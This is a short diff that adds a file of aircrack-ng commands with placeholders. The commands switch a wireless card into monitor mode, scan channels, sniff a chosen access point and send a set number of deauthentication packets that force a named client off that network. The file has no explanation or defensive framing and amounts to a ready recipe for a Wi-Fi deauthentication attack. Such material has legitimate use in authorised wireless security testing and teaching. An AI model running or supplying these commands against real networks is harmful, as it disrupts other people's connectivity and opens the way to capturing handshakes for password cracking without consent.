@@ -1,0 +1,9 @@
+sudo airmon-ng start <wireless_device_name>
+
+sudo airodump-ng -C 4575-5975 wlan0mon
+
+sudo airodump-ng --channel <channel_of_ap> --bssid <mac_of_ap> wlan0mon
+
+sudo aireplay-ng --deauth <no_of_death_packets> -c <mac_of_client> -a <mac_of_ap> wlan0mon
+
+sudo airmon-ng stop wlan0mon
